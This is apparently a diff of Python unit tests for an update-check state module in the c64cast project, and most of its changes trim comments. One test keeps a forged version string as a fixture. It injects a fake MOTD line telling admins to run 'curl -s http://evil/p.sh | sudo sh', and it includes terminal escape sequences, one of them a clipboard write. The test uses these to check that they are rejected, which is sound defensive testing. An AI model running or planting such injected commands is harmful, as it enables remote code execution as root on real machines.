@@ -104,9 +104,8 @@ class WriteFailureTest(unittest.TestCase):
 
     def test_a_directory_planted_at_the_slot_warns_instead_of_raising(self):
         # One mkdir by whatever account owns the data root used to make every
-        # subsequent `--check-for-updates --write-state` traceback: os.replace
-        # cannot rename a file onto a directory, and record_check did not
-        # catch it, so the slot could never be repaired.
+        # subsequent `--check-for-updates --write-state` traceback: os.replace cannot
+        # rename a file onto a directory, so the slot could never be repaired.
         with _tmp_dir() as d:
             planted = Path(d) / "update_check.json"
             planted.mkdir()
@@ -159,9 +158,8 @@ class RecordCheckTest(unittest.TestCase):
             self.assertEqual(kept.checked_at, 2.0)
 
     def test_a_kept_answer_is_re_answered_for_a_version_upgraded_since(self):
-        # Upgraded to the release the kept answer names, then a failed
-        # attempt: the notice settles rather than being carried forward as a
-        # standing offer of a release this install already has.
+        # Upgraded to the release the kept answer names, then a failed attempt: the
+        # notice settles rather than standing as an offer of a release already held.
         with _tmp_json_path() as path:
             record_check(self.answered, path=path)
             record_check(replace(self.unanswered, running_version="0.6.0"), path=path)
@@ -181,9 +179,8 @@ class RecordCheckTest(unittest.TestCase):
             )
 
     def test_the_silence_is_dated_from_the_first_failure_not_the_latest(self):
-        # What tells a reader how old the held answer is. `checked_at` cannot:
-        # an appliance offline for a year still bumps it daily as its timer
-        # fails.
+        # `checked_at` cannot tell a reader how old the held answer is: an appliance
+        # offline for a year still bumps it daily as its timer fails.
         with _tmp_json_path() as path:
             record_check(self.answered, path=path)
             record_check(replace(self.unanswered, checked_at=100.0), path=path)
@@ -261,21 +258,17 @@ class ReadToleranceTest(unittest.TestCase):
                 self.assertIsNone(read_update_state(path=path))
 
     def test_invalid_utf8_bytes_read_as_none(self):
-        # read_text signals bad bytes with UnicodeDecodeError, a ValueError,
-        # and the read was guarded by `except OSError` alone — so one bad byte
-        # raised out of a "never raises" function into GET /api/update and
-        # into the login MOTD script, and record_check (which reads before it
-        # writes) could never repair the slot.
+        # read_text signals bad bytes with UnicodeDecodeError, a ValueError, and the
+        # read was guarded by `except OSError` alone — so one bad byte raised out of
+        # a "never raises" function, and record_check could never repair the slot.
         with _tmp_json_path() as path:
             path.write_bytes(b'{"checked_at": 1.0, "running_ver\xff\xfe')
             with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                 self.assertIsNone(read_update_state(path=path))
 
     def test_a_stringly_typed_newer_is_rejected_not_coerced(self):
-        # bool("false") is True, so this used to read back as a pending
-        # upgrade to the release the box already runs — and `rechecked`
-        # cannot correct it, since a matching running_version is returned
-        # untouched.
+        # bool("false") is True, so this used to read back as a pending upgrade to
+        # the release the box already runs, and `rechecked` cannot correct it.
         with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
             self.assertIsNone(self._slot_from({"newer": "false"}))
 
@@ -287,11 +280,9 @@ class ReadToleranceTest(unittest.TestCase):
                         self.assertIsNone(self._slot_from({field: value}))
 
     def test_a_version_carrying_a_newline_or_escape_is_rejected(self):
-        # The file is written by the unprivileged account
-        # packaging/systemd/c64cast-update-check.service runs as; the line
-        # motd_line builds from it is printed by /etc/update-motd.d/, which
-        # pam_motd runs as root. A newline forges an extra MOTD line, and an
-        # ESC byte rewrites the banner around it.
+        # The file is written by the unprivileged account the update-check unit runs
+        # as; the motd_line built from it is printed by /etc/update-motd.d/, which
+        # pam_motd runs as root. A newline forges an MOTD line, an ESC byte the banner.
         forged = "0.6.0\n\nSECURITY: apply the hotfix now: curl -s http://evil/p.sh | sudo sh\n"
         for value in (forged, "0.6.0\x1b[2J", "0.6.0\x1b]52;c;cGF5bG9hZA==\x07"):
             with self.subTest(value=value):
@@ -299,9 +290,9 @@ class ReadToleranceTest(unittest.TestCase):
                     self.assertIsNone(self._slot_from({"latest_version": value}))
 
     def test_a_non_finite_timestamp_is_rejected(self):
-        # json.loads accepts the bare NaN/Infinity literals, and every
-        # comparison in is_stale reads as "not stale" for either — one write
-        # disabled the module's only safeguard against quoting a dead answer.
+        # json.loads accepts the bare NaN/Infinity literals. Rejecting them here,
+        # not just at is_stale's isfinite guard, is what stops one bad write from
+        # disabling the module's only safeguard against quoting a dead answer.
         for field in ("checked_at", "unanswered_since"):
             for literal in ("NaN", "Infinity", "-Infinity"):
                 with self.subTest(field=field, literal=literal):
@@ -436,9 +427,8 @@ class IsStaleTest(unittest.TestCase):
         self.assertFalse(is_stale(blipped, NOW))
 
     def test_a_date_in_the_future_is_stale_rather_than_fresh(self):
-        # "Can't tell how old this is" is not "recent" — the same asymmetry
-        # _checkout_is_dirty's None gets. A far-future date otherwise made
-        # every comparison here read as fresh, forever.
+        # "Can't tell how old this is" is not "recent" — a far-future date otherwise
+        # made every comparison here read as fresh, forever.
         dated_ahead = UpdateCheck(
             checked_at=_days_ago(-3650),
             running_version="0.5.0",
@@ -506,10 +496,9 @@ class MotdLineTest(unittest.TestCase):
         self.assertIn("c64cast --check-for-updates", line)
 
     def test_the_stale_line_blames_the_check_rather_than_pypi(self):
-        # is_stale falls back to checked_at when unanswered_since is None, and
-        # in that branch the last attempt *did* answer — the no-timer laptop
-        # nobody has asked in a while. "No answer from PyPI" sent an admin
-        # hunting a network fault that does not exist.
+        # is_stale falls back to checked_at when unanswered_since is None, and in
+        # that branch the last attempt *did* answer — the no-timer laptop nobody has
+        # asked in a while. "No answer from PyPI" sends an admin hunting a phantom.
         forgotten = UpdateCheck(
             checked_at=_days_ago(365), running_version="0.5.0", latest_version="0.5.0", newer=False
         )
